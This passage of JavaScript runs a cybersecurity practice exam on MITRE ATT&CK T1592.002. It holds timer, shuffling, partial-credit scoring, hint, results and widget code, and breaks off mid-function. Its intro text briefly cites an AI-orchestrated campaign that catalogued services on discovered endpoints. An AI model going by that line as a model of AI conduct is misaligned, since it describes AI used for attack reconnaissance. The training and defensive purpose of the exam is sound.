<b>Anthropic AI-orchestrated Campaign (C0062)</b> catalogued services and data on discovered endpoints.</p>\n<p>Defensive anchors: mitigation <b>M1056 Pre-compromise</b> (minimise the amount and sensitivity of data available to external parties — you cannot prevent outside reading) and detection strategy <b>DET0888</b> with analytic <b>AN2020</b>: internet scanners looking for patterns of malicious host-info collection, with a <b>very high occurrence and false-positive rate</b>, often outside your visibility — which is why defenders also focus on the Initial Access stage.</p>\n<p>Your working roles at this tier: SOC senior triage, CTI attribution reasoning, detection engineering and tuning, IR scoping, red-team tradecraft, and GRC control mapping.</p>\n","keywords":[{"t":"Identity & lifecycle","chips":["T1592.002","Reconnaissance TA0043","PRE","vs T1082","vs T1046","vs T1595.002"]},{"t":"Vectors","chips":["banners","user agents","file metadata → CVE","public datasets","watering-hole scripts"]},{"t":"CTI procedures","chips":["G0138 Andariel","G0059 Magic Hound","G0034 Sandworm Team","C0062 Anthropic campaign"]},{"t":"Defense","chips":["M1056 Pre-compromise","DET0888 / AN2020","high false-positive rate","Initial Access focus","canary documents"]},{"t":"IR reasoning","chips":["least-aggressive action","approved-scanner confusion","impersonated sources","evidence preservation"]},{"t":"Terminal skills","chips":["forensic-safe tool choice","log pipelines (grep/awk/sort/wc)"]}],"how":"\n<p><b>Goal:</b> score at least <b>70%</b> to pass. This is the <b>HARD</b> tier: 2–3 interacting concepts per exercise, near-miss answers that are correct in a *different* context, and at least one trap per family — alarming-but-benign, benign-but-alarming, and least-aggressive-action.</p>\n<p><b>Exercise types:</b> multi-artefact classification, log-viewer escalation picking, a 4-step IR decision tree with conflicting signals, terminal exercises (two, non-adjacent: one forensic tool choice, one log pipeline), ATT&amp;CK mapping, ranking, timeline ordering, detection-gap analysis, and a dual red/blue scenario.</p>\n<p><b>Partial credit:</b> multi-item exercises score (correct − wrong) ÷ items. Wrong selections subtract. Selecting everything is zero. Single-answer exercises are pass/fail.</p>\n<p><b>Check and the timer:</b> <b>Check</b> stops the timer automatically for unlimited feedback reading; the timer resumes on <b>Next</b>. In multi-step exercises only the final Check pauses the timer. <b>Pause</b> hides the exercise for a normal break. Terminal exercises show realistic output after you run a command, and typos are not forgiven beyond spacing and case.</p>\n<p><b>Hints and skipping:</b> one hint per exercise (−10% of that exercise's credit); hints remove one wrong path, they never name the answer. Skipped exercises can be revisited before the end; skipped-and-never-answered ones are excluded from the score.</p>\n<p><b>Retake:</b> reshuffles everything for another attempt.</p>\n"}};

"use strict";
/* ============ Cyber Pulse Academy exam shell — T1592.002 ============ */
var EX = EXAM.exercises;
var ORDER = [];            /* exercise indices in play order */
var ORDERPOS = {};         /* exIndex -> 1-based position label */
var curEx = -1;            /* current exercise index (into EX) */
var fromReview = false;
var skipPool = [];         /* exercise indices skipped & unanswered */
var ansState = {};         /* exIndex -> 'answered' | 'skipped' */
var ansCredit = {};        /* exIndex -> float credit */
var answeredCount = 0;
var creditSum = 0;         /* float accumulator */
var hintUsed = {};         /* exIndex -> true */
var reported = false;
var inReview = false;
var resultsShown = false;
var widget = null;         /* active widget controller */

/* ---- timer state machine: RUNNING | PAUSED_MANUAL | PAUSED_AUTO_CHECK | ENDED ---- */
var TS = { RUN:'RUNNING', PM:'PAUSED_MANUAL', PA:'PAUSED_AUTO_CHECK', END:'ENDED' };
var tstate = TS.RUN;
var remain = EXAM.timerSec;
var resumeTarget = TS.RUN;
var manualMark = 0, autoMark = 0;
var pauseManualSec = 0, pauseAutoSec = 0;
var exTimerLeft = 0;       /* reduced per-exercise timer (seconds) */
var ended = false;

function $(id){ return document.getElementById(id); }
function esc(s){ return String(s).replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;').replace(/"/g,'&quot;'); }
function fmtT(s){ s=Math.max(0,s|0); var m=(s/60)|0, r=s%60; return (m<10?'0':'')+m+':'+(r<10?'0':'')+r; }
function shuffle(a){ a=a.slice(); for(var i=a.length-1;i>0;i--){ var j=Math.floor(Math.random()*(i+1)); var t=a[i]; a[i]=a[j]; a[j]=t; } return a; }
function pct(x){ return Math.round(x*100); }
/* partial-credit scoring engine (mandatory formula) */
function scoreExercise(H,W,N){ if(N<=0){return 0;} return Math.max(0,(H-W)/N); }

/* ============ header rendering ============ */
function stateInfo(){
  if(tstate===TS.RUN)  return {cls:'tstate-run',  ic:'▶', w:'RUNNING'};
  if(tstate===TS.PM)   return {cls:'tstate-pm',   ic:'⏸', w:'PAUSED — manual (press Resume)'};
  if(tstate===TS.PA)   return {cls:'tstate-pa',   ic:'⏸', w:'PAUSED — reviewing feedback (resumes on Next)'};
  return {cls:'tstate-end', ic:'⏹', w:'ENDED'};
}
function renderHeader(){
  var si = stateInfo();
  $('t-clock').textContent = '⏱ '+fmtT(remain);
  var st = $('t-state'); st.textContent = si.ic+' '+si.w; st.className = 'hchip '+si.cls;
  var shown = Math.round(creditSum*10)/10;
  var p = answeredCount>0 ? pct(creditSum/answeredCount) : 0;
  $('t-score').innerHTML = 'Score <b>'+shown.toFixed(1)+' / '+answeredCount+'</b> · '+p+'%';
}
function renderCounter(exIdx){
  $('t-count').innerHTML = 'Exercise <b>'+(ORDERPOS[exIdx]||'-')+' of '+EX.length+'</b>';
  var sev = $('t-sev'); if(sev){ /* severity badge is static per file */ }
}

/* ============ pause logging ============ */
function nowSec(){ return Date.now()/1000; }
function enterAutoPause(){
  if(tstate===TS.END){ return; }
  tstate = TS.PA; autoMark = nowSec(); renderHeader();
}
function leaveAutoPause(){
  if(autoMark>0){ pauseAutoSec += Math.max(0, nowSec()-autoMark); autoMark=0; }
}
function manualPause(){
  if(tstate===TS.RUN){ resumeTarget = TS.RUN; }
  else if(tstate===TS.PA){ resumeTarget = TS.PA; }
  else { return; }
  tstate = TS.PM; manualMark = nowSec();
  renderHeader(); showPauseOverlay();
}
function manualResume(){
  if(manualMark>0){ pauseManualSec += Math.max(0, nowSec()-manualMark); manualMark=0; }
  tstate = resumeTarget;
  hidePauseOverlay(); renderHeader();
}
function showPauseOverlay(){
  var ov = $('pause-overlay'); if(!ov) return;
  $('stage').classList.add('hid');
  ov.classList.remove('hid');
}
function hidePauseOverlay(){
  var ov = $('pause-overlay'); if(!ov) return;
  ov.classList.add('hid');
  $('stage').classList.remove('hid');
}

/* ============ timer ============ */
function tick(){
  if(tstate!==TS.RUN || ended){ return; }
  remain--;
  if(remain<=0){ remain=0; renderHeader(); timeUp(); return; }
  var c = EX[curEx];
  if(c && c.terminal && c.terminal.timerSec && exTimerLeft>0 && ansState[curEx]!=='answered'){
    exTimerLeft--;
    var chip = $('extimer');
    if(chip){ chip.textContent='⏳ '+fmtT(exTimerLeft)+' left on this console'; }
    if(exTimerLeft<=0){ gradeCurrent(true); }
  }
  renderHeader();
}
function timeUp(){
  if(ended){ return; }
  ended = true; tstate = TS.END; renderHeader();
  finish(true);
}

/* ============ flow ============ */
function buildOrder(){
  ORDER = shuffle(EX.map(function(_,i){ return i; }));
  /* brief contract: the two terminal exercises must never be adjacent in play order */
  for(var guard=0; guard<50; guard++){
    var bad = -1;
    for(var k=0;k<ORDER.length-1;k++){
      if(EX[ORDER[k]].type==='terminal' && EX[ORDER[k+1]].type==='terminal'){ bad=k; break; }
    }
    if(bad<0){ break; }
    var other = -1;
    for(var k2=0;k2<ORDER.length;k2++){
      if(k2!==bad && k2!==bad+1 && EX[ORDER[k2]].type!=='terminal' &&
         (bad+2>=ORDER.length || k2!==bad+2) && (bad-1<0 || k2!==bad-1)){ other=k2; break; }
    }
    if(other<0){ break; }
    var tmp = ORDER[bad+1]; ORDER[bad+1] = ORDER[other]; ORDER[other] = tmp;
  }
  ORDERPOS = {};
  ORDER.forEach(function(exIdx,i){ ORDERPOS[exIdx] = i+1; });
}
function startExam(){
  $('intro').classList.add('hid');
  $('exam').classList.remove('hid');
  buildOrder();
  renderHeader();
  nextUnanswered();
}
function nextUnanswered(){
  fromReview = false; inReview = false;
  var next = null;
  for(var k=0;k<ORDER.length;k++){
    var i = ORDER[k];
    if(!ansState[i]){ next = i; break; }
  }
  if(next===null){
    if(skipPool.length>0){ showReview(); } else { finish(false); }
    return;
  }
  renderExercise(next,false);
}
function showReview(){
  inReview = true; fromReview = false;
  updateHeaderButtons();
  var host = $('stage'); host.innerHTML='';
  var h = '<div class="card skipwrap"><h2>Review skipped exercises</h2>'+
    '<p>You skipped '+skipPool.length+' exercise'+(skipPool.length===1?'':'s')+
    '. You can go back to any of them and answer it now, as long as the timer has not ended. '+
    'Skipped exercises that stay unanswered are excluded from your score — they do not count for or against you.</p><div class="rlist">';
  skipPool.forEach(function(i){
    h += '<div class="ritem"><span class="ic">⚠</span><span>'+esc(EX[i].title)+'</span>'+
         '<button class="btn" data-rev="'+i+'">Answer this one</button></div>';
  });
  h += '</div><div style="margin-top:14px;display:flex;gap:10px;flex-wrap:wrap">'+
       '<button class="btn primary" id="btn-finish">Finish exam</button></div></div>';
  host.innerHTML = h;
  Array.prototype.forEach.call(host.querySelectorAll('[data-rev]'), function(b){
    b.addEventListener('click', function(){
      var i = parseInt(b.getAttribute('data-rev'),10);
      inReview = false; fromReview = true; renderExercise(i,true);
    });
  });
  $('btn-finish').addEventListener('click', function(){ finish(false); });
}

/* ============ exercise rendering ============ */
function fmtText(s){
  var t = esc(s);
  t = t.replace(/`([^`]+)`/g, function(m,a){ return '<code class="inline-code">'+a+'</code>'; });
  t = t.replace(/\*\*([^*]+)\*\*/g, function(m,a){ return '<b>'+a+'</b>'; });
  t = t.replace(/\n/g,'<br>');
  return t;
}
function scenarioHTML(ex){
  var inner = '';
  (ex.scenario||[]).forEach(function(p){
    if(p[0]==='p'){ inner += '<p class="prose">'+fmtText(p[1])+'</p>'; }
    else if(p[0]==='art'){
      inner += '<div class="art"><div class="art-h">'+esc(p[1])+'</div><div class="art-b"><div class="mono">'+esc(p[2])+'</div></div></div>';
    }
    else if(p[0]==='note'){ inner += '<p class="small">'+fmtText(p[1])+'</p>'; }
    else if(p[0]==='tbl'){
      var rows = p[1]; var t='<table class="tbl">';
      rows.forEach(function(r,ri){ t+='<tr>'; r.forEach(function(c){ t+= (ri===0?'<th>':'<td>')+fmtText(c)+ (ri===0?'</th>':'</td>'); }); t+='</tr>'; });
      inner += t+'</table>';
    }
  });
  if(ex.collapsed){
    return '<details class="artwrap"><summary>📁 SCENARIO — '+esc(ex.summary||'read the scenario')+' (click to expand)</summary><div class="blk-b">'+inner+'</div></details>';
  }
  return '<div class="blk-h">🧾 SCENARIO</div><div class="blk-b">'+inner+'</div>';
}
function renderExercise(i, reviewMode){
  curEx = i;
  var ex = EX[i];
  var host = $('stage');
  var collapsed = !!ex.collapsed;
  var h = '<div class="ex-head"><span class="exnum">Exercise '+(ORDERPOS[i]||'-')+' of '+EX.length+'</span>'+
          '<span class="badge-sev '+EXAM.sevClass+'">'+esc(EXAM.sevName)+'</span>'+
          '<span class="ex-title">'+esc(ex.title)+'</span>'+
          (ex.terminal && ex.terminal.timerSec ? '<span class="exchip" id="extimer">⏳ '+fmtT(ex.terminal.timerSec)+' left on this console</span>':'')+
          '</div>';
  h += '<div class="blk scenario">'+scenarioHTML(ex)+'</div>';
  h += '<div class="blk question"><div class="blk-h">❓ QUESTION</div><div class="blk-b"><p class="qtext">'+fmtText(ex.q)+'</p></div></div>';
  h += '<div class="blk answer"><div class="blk-h">✍️ YOUR ANSWER</div><div class="blk-b" id="ansarea"></div></div>';
  h += '<div id="fbhost"></div>';
  host.innerHTML = h;
  renderCounter(i);
  $('fbhost').innerHTML='';
  widget = makeWidget(ex, $('ansarea'), reviewMode);
  widget.render();
  var bar = document.createElement('div');
  bar.style.cssText='display:flex;gap:10px;margin-top:12px;flex-wrap:wrap';
  bar.innerHTML = (ex.type==='tree'?'':'<button class="btn good" id="btn-check">Check</button>')+
                  (hintUsed[i]?'':'<button class="btn warn" id="btn-hint2">💡 Hint (−10% of this exercise)</button>');
  $('ansarea').appendChild(bar);
  var cb = $('btn-check');
  if(cb){ cb.addEventListener('click', function(){ gradeCurrent(false); }); }
  var hb = $('btn-hint2');
  if(hb){ hb.addEventListener('click', function(){ useHint(); }); }
  if(ex.hint && hintUsed[i]){ /* already used before returning from review */ }
  updateHeaderButtons();
}
function updateHeaderButtons(){
  var inactive = (curEx<0 || inReview || ansState[curEx]==='answered');
  var sk = $('btn-skip');
  if(sk){ sk.disabled = inactive; }
  var pa = $('btn-pause');
  if(pa){ pa.disabled = (tstate===TS.END); }
  var hh = $('btn-hint');
  if(hh){ hh.disabled = (inactive || !!hintUsed[curEx]); }
}
function useHint(){
  var i = curEx, ex = EX[i];
  if(i<0 || !ex || hintUsed[i] || ansState[i]==='answered'){ return; }
  hintUsed[i] = true;
  updateHeaderButtons();
  var fb = $('fbhost');
  var note = document.createElement('div');
  note.className = 'outcome';
  note.innerHTML = '<b>💡 HINT (this exercise will lose 10% of its credit)</b>'+fmtText(ex.hint||'Look again at the scenario and the question.');
  fb.insertBefore(note, fb.firstChild);
  var b2 = $('btn-hint2'); if(b2){ b2.remove(); }
}

/* ============ grading ============ */
function gradeCurrent(autoExpired){
  var i = curEx, ex = EX[i];
  if(ansState[i]==='answered'){ return; }
  /* FIRST action per spec: stop the timer into the auto-check pause state */
  enterAutoPause();
  if(autoExpired){ exTimerLeft = 0; var chip=$('extimer'); if(chip){ chip.textContent='⏳ time on this console has run out'; } }
  var res = widget.grade();            /* {H,W,N,items[],expl?} */
  var credit = scoreExercise(res.H,res.W,res.N);
  if(hintUsed[i]){ credit = Math.max(0, credit - 0.10); }
  ansCredit[i] = credit; ansState[i]='answered'; answeredCount++; creditSum += credit;
  renderFeedback(ex, res, credit, autoExpired);
  renderHeader(); updateHeaderButtons();
  var fbh = $('fbhost');
  if(fbh && fbh.scrollIntoView){ fbh.scrollIntoView({behavior:'smooth', block:'nearest'}); }
}
function fbLabel(credit){
  if(credit>=0.9999){ return {t:'✓ CORRECT', cls:'ok'}; }
  if(credit>0){ return {t:'◐ PARTIALLY CORRECT', cls:'part'}; }
  return {t:'✗ INCORRECT', cls:'bad'};
}
function renderFeedback(ex, res, credit, autoExpired){
  var L = fbLabel(credit);
  var isMulti = res.N>1;
  var h = '<div class="fb '+L.cls+'"><div class="fb-h">'+L.t+'</div><div class="fb-b">';
  if(hintUsed[curEx]){ h += '<p class="small" style="margin:0 0 8px">💡 Hint was used on this exercise — the 10% credit reduction is already applied below.</p>'; }
  if(isMulti){ h += '<div class="fb-credit">credit '+credit.toFixed(2)+' — '+res.H+'/'+res.N+' items</div>'; }
  if(autoExpired){ h += '<p class="small">⏳ The console timer ran out, so your answer was submitted automatically.</p>'; }
  if(isMulti && res.items && res.items.length){
    h += '<div class="items">';
    res.items.forEach(function(it){
      var ic = it.s==='ok' ? '✓' : (it.s==='bad' ? '✗' : '○');
      var cl = it.s==='ok' ? 'ok' : (it.s==='bad' ? 'bad' : 'miss');
      var w  = it.s==='ok' ? 'Correct' : (it.s==='bad' ? 'Wrong' : 'Missed');
      h += '<div class="itm '+cl+'"><span class="ic">'+ic+'</span><span><b>'+w+':</b> '+fmtText(it.label)+(it.why? ' — '+fmtText(it.why):'')+'</span></div>';
    });
    h += '</div>';
  }
  h += '<p class="prose">'+fmtText(res.expl || ex.expl || '')+'</p>';
  if(res.N===1 && res.items && res.items.length){ h += '<div class="items">';
    res.items.forEach(function(it){
      var ic = it.s==='ok'?'✓':'✗'; var cl = it.s==='ok'?'ok':'bad'; var w = it.s==='ok'?'Correct':'Wrong';
      h += '<div class="itm '+cl+'"><span class="ic">'+ic+'</span><span><b>'+w+':</b> '+fmtText(it.label)+(it.why?' — '+fmtText(it.why):'')+'</span></div>';
    }); h += '</div>'; }
  if(ex.type==='terminal'){
    var term = ex.terminal;
    h += '<div class="synpanel"><h4>CANONICAL COMMAND</h4><div class="copyblk"><code class="inline-code" id="canon">'+esc(term.expected)+'</code>'+
         '<button class="copybtn" id="btn-copy">Copy</button></div>'+
         '<p style="margin:.5rem 0 0">Why it is built this way:</p><ul class="small">';
    (term.parts||[]).forEach(function(p){ h += '<li>'+fmtText(p)+'</li>'; });
    (term.bad||[]).forEach(function(bd){ h += '<li>⚠ '+fmtText(bd.why)+'</li>'; });
    h += '</ul></div>';
  }
  if(ex.study){ h += '<div class="study"><b>What to study next:</b> '+fmtText(ex.study)+'</div>'; }
  var isLast = (function(){
    for(var k=0;k<ORDER.length;k++){ var j=ORDER[k]; if(j!==curEx && !ansState[j]){ return false; } }
    return true;
  })();
  var reviewNeeded = skipPool.filter(function(i){ return ansState[i]!=='answered'; }).length>0;
  var nxt = !isLast ? 'Next ▸' : (reviewNeeded ? 'Review skipped ⏭' : 'Final Submit');
  h += '</div></div><div style="margin-top:12px"><button class="btn primary" id="btn-next">'+nxt+'</button></div>';
  $('fbhost').innerHTML = h;
  var cb = $('btn-copy');
  if(cb){ cb.addEventListener('click', function(){
    try{ navigator.clipboard.writeText($('canon').textContent); cb.textContent='Copied ✓'; setTimeout(function(){cb.textContent='Copy';},1500); }
    catch(e){ cb.textContent='Select & copy'; }
  }); }
  $('btn-next').addEventListener('click', function(){
    leaveAutoPause();
    if(tstate!==TS.END){ tstate = TS.RUN; }
    renderHeader();
    widget = null;
    if(fromReview){ fromReview=false; showReview(); }
    else if(isLast){
      if(reviewNeeded){ showReview(); } else { finish(false); }
    }
    else { nextUnanswered(); }
  });
  /* disable answering further */
  var aa = $('ansarea'); if(aa){ aa.classList.add('disabled'); Array.prototype.forEach.call(aa.querySelectorAll('button,input,select'), function(el){ el.disabled=true; }); }
}

/* ============ skip ============ */
function skipCurrent(){
  var i = curEx;
  if(ansState[i]==='answered'){ return; }
  if(ansState[i]!=='skipped'){ ansState[i]='skipped'; skipPool.push(i); }
  widget=null;
  if(fromReview){ fromReview=false; showReview(); return; }
  nextUnanswered();
}

/* ============ results ============ */
function finish(timeRanOut){
  if(resultsShown){ return; }
  resultsShown = true;
  if(timeRanOut){ /* timer already marked ENDED */ } else { ended = true; tstate = TS.END; renderHeader(); }
  hidePauseOverlay();
  var answeredIdx = Object.keys(ansState).filter(function(k){ return ansState[k]==='answered'; }).map(Number);
  var full=0, part=0, zero=0, partSum=0;
  answeredIdx.forEach(function(i){ var c=ansCredit[i]; if(c>=0.9999){full++;} else if(c>0){part++; partSum+=c;} else {zero++;} });
  var skippedLeft = Object.keys(ansState).filter(function(k){ return ansState[k]==='skipped'; }).map(Number);
  var neverTouched = EX.length - answeredIdx.length - skippedLeft.length;
  var pctFinal = answeredIdx.length>0 ? Math.round(creditSum/answeredIdx.length*100) : 0;
  var passed = pctFinal>=EXAM.passMark;
  $('exam').classList.add('hid');
  var r = $('results'); r.classList.remove('hid');
  var h = '<div class="card res"><h2>'+(timeRanOut?'⏹ Time is up — final results':'🏁 Final results')+'</h2>';
  h += '<p class="small">Score is computed only over exercises you actually answered. Skipped-and-unanswered exercises are excluded from the score completely.</p>';
  h += '<div class="score-big">'+(Math.round(creditSum*10)/10).toFixed(1)+' / '+answeredIdx.length+' · '+pctFinal+'%</div>';
  if(passed){
    h += '<div class="cert"><div class="big">✓ PASS — Congratulations!</div>'+
         '<p>You passed the '+esc(EXAM.sevName)+' practice exam for <b>'+esc(EXAM.topicTitle)+'</b> with '+pctFinal+'% (pass mark '+EXAM.passMark+'%).</p>'+
         '<p class="small">Cyber Pulse Academy · MITRE ATT&CK '+esc(EXAM.topicId.toUpperCase())+' · '+esc(EXAM.sevName)+' tier</p></div>';
  } else {
    h += '<div class="fail"><div class="big">✗ FAIL — '+pctFinal+'%</div>'+
         '<p>You need at least '+EXAM.passMark+'% to pass. You must retake this exam.</p>'+
         '<p class="small">Review the explanations you saw after each Check, then try again.</p></div>';
  }
  h += '<div class="res-grid">'+
    '<div class="res-card"><div class="n">'+full+'</div><div class="l">✓ fully correct</div></div>'+
    '<div class="res-card"><div class="n">'+part+'</div><div class="l">◐ partially correct'+(part>0?' (avg '+(partSum/part).toFixed(2)+')':'')+'</div></div>'+
    '<div class="res-card"><div class="n">'+zero+'</div><div class="l">✗ fully incorrect</div></div>'+
    '<div class="res-card"><div class="n">'+(skippedLeft.length+neverTouched)+'</div><div class="l">⚠ skipped / unanswered (excluded)</div></div>'+
    '</div>';
  h += '<div class="pauselog">⏱ Time paused manually: <b>'+fmtT(Math.round(pauseManualSec))+'</b> · '+
       '⏸ Time reviewing feedback (auto-pause): <b>'+fmtT(Math.round(pauseAutoSec))+'</b> · '+
       'Time remaining: <b>'+fmtT(remain)+'</b></div>';
  h += '<div class="rlist">';
  ORDER.forEach(function(i){
    var st = ansState[i];
    var ic, tx;
    if(st==='answered'){ var c=ansCredit[i]; ic = c>=0.9999?'✓':(c>0?'◐':'✗'); tx='credit '+c.toFixed(2); }
    else { ic='⚠'; tx='skipped — excluded from score'; }
    h += '<div class="ritem"><span class="ic">'+ic+'</span><span>Exercise '+(ORDERPOS[i])+' — '+esc(EX[i].title)+'</span><span style="margin-left:auto">'+tx+'</span></div>';
  });
  h += '</div><div style="margin-top:16px"><button class="btn primary" id="btn-retake">↺ Retake Exam</button></div></div>';
  r.innerHTML = h;
  $('btn-retake').addEventListener('click', retake);
  reportScore(creditSum, answeredIdx.length);
}
function clearShuffles(){
  EX.forEach(function(ex){
    delete ex._optOrder; delete ex._bank; delete ex._chips; delete ex._shuf; delete ex._timerInit;
    if(ex.steps){ ex.steps.forEach(function(s){ delete s._order; }); }
  });
}
function retake(){
  reported = false; ended = false; tstate = TS.RUN; resultsShown = false;
  remain = EXAM.timerSec; creditSum = 0; answeredCount = 0;
  ansState = {}; ansCredit = {}; hintUsed = {}; skipPool = [];
  pauseManualSec = 0; pauseAutoSec = 0; manualMark = 0; autoMark = 0;
  clearShuffles();
  $('results').classList.add('hid');
  $('exam').classList.remove('hid');
  $('stage').innerHTML='';
  buildOrder(); renderHeader(); nextUnanswered();
}

/* ============ website integration ============ */
function reportScore(cSum, answeredN){
  if(reported){ return; }
  reported = true;
  var percent = answeredN>0 ? Math.round((cSum/answeredN)*100) : 0;
  try{
    parent.postMessage({
      type:'CYBERPULSE_SCORE',
      topicId: EXAM.topicId,
      batch: EXAM.batch,
      score: Math.round(cSum),
      total: answeredN,
      percent: percent,
      passed: percent>=EXAM.passMark
    }, location.origin);
  }catch(e){ /* opened directly, nothing to report to */ }
}
window.addEventListener('message', function(event){
  if(!event.data){ return; }
  if(event.data.type!=='CYBERPULSE_INIT' && event.data.type!=='CYBERMASTERY_INIT'){ return; }
  try{
    if(event.data.username && $('who')){ $('who').textContent = 'Good luck, '+String(event.data.username).slice(0,40)+'!'; }
  }catch(e){}
});


/* ================= WIDGET FACTORY ================= */
function makeWidget(ex, host, reviewMode){
  var w = { ex:ex, host:host, reviewMode:reviewMode };
  var builders = {
    qcm: buildQcm, multi: buildQcm, fill: buildFill, match: buildMatch, dnd: buildDnd,
    order: buildOrderW, rank: buildOrderW, terminal: buildTerminal, logview: buildLogview,
    tree: buildTree, selblank: buildSelblank
  };
  var b = builders[ex.type] || buildQcm;
  w.render = function(){ b(w); };
  w.grade = function(){ return w._grade ? w._grade() : {H:0,W:0,N:1,items:[],expl:ex.expl}; };
  return w;
}
function letters(i){ return 'ABCDEFGH'.charAt(i%8)+'.'; }
function clip(s,n){ s=String(s); return s.length>n? s.slice(0,n)+'…' : s; }

/* ---------- QCM / multi-select ---------- */
function buildQcm(w){
  var ex = w.ex, host = w.host;
  if(!ex._optOrder){ ex._optOrder = shuffle(ex.options.map(function(_,i){return i;})); }
  var multi = ex.type==='multi';
  var h = '<div class="opts" role="'+(multi?'group':'radiogroup')+'">';
  ex._optOrder.forEach(function(oi,k){
    h += '<button type="button" class="opt" data-i="'+oi+'"><span class="lt">'+letters(k)+'</span><span>'+fmtText(ex.options[oi].t)+'</span></button>';
  });
  h += '</div>';
  if(multi){ h += '<p class="small" style="margin-top:8px">Select all that apply, then press Check. Wrong selections subtract from correct ones.</p>'; }
  host.insertAdjacentHTML('afterbegin', h);
  var sel = {};
  Array.prototype.forEach.call(host.querySelectorAll('.opt'), function(btn){
    btn.addEventListener('click', function(){
      var i = btn.getAttribute('data-i');
      if(multi){
        sel[i] = !sel[i]; btn.classList.toggle('sel', !!sel[i]);
      } else {
        sel = {}; sel[i] = true;
        Array.prototype.forEach.call(host.querySelectorAll('.opt'), function(b2){ b2.classList.remove('sel'); });
        btn.classList.add('sel');
      }
    });
  });
  w._grade = function(){
    var chosen = Object.keys(sel).filter(function(k){ return sel[k]; }).map(Number);
    var corr = ex.correct;
    var H=0, W=0, items=[];
    var lab = function(ci){ return letters(ex._optOrder.indexOf(ci))+' '+clip(ex.options[ci].t,90); };
    if(multi){
      corr.forEach(function(ci){
        if(sel[ci]){ H++; items.push({s:'ok', label:lab(ci), why:ex.options[ci].why}); }
        else { items.push({s:'miss', label:lab(ci), why:ex.options[ci].why}); }
      });
      chosen.forEach(function(ci){
        if(corr.indexOf(ci)<0){ W++; items.push({s:'bad', label:lab(ci), why:ex.options[ci].why}); }
      });
      return {H:H, W:W, N:corr.length, items:items, expl:ex.expl};
    }
    var ok = chosen.length===1 && corr.indexOf(chosen[0])>=0;
    if(ok){ H=1; }
    corr.forEach(function(ci){
      items.push({s: ok?'ok':'miss', label:lab(ci), why:ex.options[ci].why});
    });
    if(!ok && chosen.length===1){
      items.push({s:'bad', label:'Your choice: '+lab(chosen[0]), why:ex.options[chosen[0]].why});
    }
    return {H:H, W:W, N:1, items:items, expl:ex.expl};
  };
}

/* ---------- fill-in-the-blank (chips -> inline blanks) ---------- */
function buildFill(w){
  var ex = w.ex, host = w.host;
  if(!ex._bank){ ex._bank = shuffle(ex.bank.slice()); }
  var parts = ex.pre.split('___');
  var h = '<p class="prose">';
  parts.forEach(function(p,i){
    h += fmtText(p);
    if(i<parts.length-1){ h += '<span class="blank" data-b="'+i+'">…</span>'; }
  });
  h += '</p><div class="bank" id="fillbank"></div>';
  host.insertAdjacentHTML('afterbegin', h);
  var bank = host.querySelector('#fillbank');
  var selChip = null;
  var placed = {};           /* blankIdx -> chip element */
  ex._bank.forEach(function(word){
    var c = document.createElement('button');
    c.type='button'; c.className='chip'; c.textContent=word;
    c.addEventListener('click', function(){
      if(c.classList.contains('placed')){ return; }
      if(selChip){ selChip.classList.remove('sel'); }
      selChip = c; c.classList.add('sel');
    });
    bank.appendChild(c);
  });
  Array.prototype.forEach.call(host.querySelectorAll('.blank'), function(z){
    z.addEventListener('click', function(){
      if(!selChip){ return; }
      var bi = z.getAttribute('data-b');
      if(placed[bi]){ placed[bi].classList.remove('placed'); }
      z.textContent = selChip.textContent;
      placed[bi] = selChip;
      selChip.classList.add('placed'); selChip.classList.remove('sel');
      selChip = null;
    });
  });
  w._grade = function(){
    var H=0,W=0,items=[];
    ex.blanks.forEach(function(bset,bi){
      var chipEl = placed[bi];
      var got = chipEl ? chipEl.textContent : '';
      var ok = got!=='' && bset.accept.some(function(a){ return a.toLowerCase()===got.toLowerCase(); });
      if(got===''){ items.push({s:'miss', label:'Blank '+(bi+1)+' (left empty)', why:'Correct: “'+bset.accept[0]+'”. '+bset.why}); }
      else if(ok){ H++; items.push({s:'ok', label:'Blank '+(bi+1)+': '+got, why:bset.why}); }
      else { W++; items.push({s:'bad', label:'Blank '+(bi+1)+': '+got, why:'Correct: “'+bset.accept[0]+'”. '+bset.why}); }
    });
    return {H:H,W:W,N:ex.blanks.length,items:items,expl:ex.expl};
  };
}

/* ---------- shared chip->slot mechanics (match / dnd) ---------- */
function chipSlotWidget(w, cfg){
  var ex = w.ex, host = w.host;
  if(!ex._chips){ ex._chips = shuffle(cfg.chips.slice()); }
  var h = '<p class="small">'+(cfg.help||'Drag a chip into a box, or click a chip and then click a box.')+'</p>';
  h += '<div class="zones" id="zwrap">';
  cfg.zones.forEach(function(z){
    h += '<div class="zone" data-z="'+z.id+'" tabindex="0"><div class="zone-h">'+esc(z.label)+'</div><div class="zslots"></div></div>';
  });
  h += '</div><div class="bank" id="cbank"></div>';
  host.insertAdjacentHTML('afterbegin', h);
  var bank = host.querySelector('#cbank');
  var selChip = null;
  var placed = {};           /* chipId -> zoneId */
  ex._chips.forEach(function(ch){
    var c = document.createElement('button');
    c.type='button'; c.className='chip'+(ch.code?' code':''); c.textContent=ch.t; c.setAttribute('data-c',ch.id);
    c.draggable = true;
    c.addEventListener('click', function(){
      if(c.classList.contains('placed')){ return; }
      if(selChip){ selChip.classList.remove('sel'); }
      selChip = c; c.classList.add('sel');
    });
    c.addEventListener('dragstart', function(ev){ try{ ev.dataTransfer.setData('text/plain', ch.id); }catch(e){} selChip=c; c.classList.add('sel'); });
    bank.appendChild(c);
  });
  function dropInto(z, c){
    if(!c || !z){ return; }
    var zid = z.getAttribute('data-z');
    if(c._slot && c._slot.parentNode){ c._slot.parentNode.removeChild(c._slot); }
    var slot = document.createElement('span');
    slot.className='slot chip'+(c.classList.contains('code')?' code':'');
    slot.textContent = c.textContent;
    z.querySelector('.zslots').appendChild(slot);
    c._slot = slot;
    c.classList.add('placed'); c.classList.remove('sel');
    placed[c.getAttribute('data-c')] = zid;
    selChip = null;
  }
  Array.prototype.forEach.call(host.querySelectorAll('.zone'), function(z){
    z.addEventListener('click', function(){ if(selChip){ dropInto(z, selChip); } });
    z.addEventListener('keydown', function(ev){ if((ev.key==='Enter'||ev.key===' ') && selChip){ ev.preventDefault(); dropInto(z, selChip); } });
    z.addEventListener('dragover', function(ev){ ev.preventDefault(); z.classList.add('over'); });
    z.addEventListener('dragleave', function(){ z.classList.remove('over'); });
    z.addEventListener('drop', function(ev){
      ev.preventDefault(); z.classList.remove('over');
      var cid=''; try{ cid = ev.dataTransfer.getData('text/plain'); }catch(e){}
      var c = bank.querySelector('[data-c="'+cid+'"]') || selChip;
      dropInto(z, c);
    });
  });
  w._grade = function(){
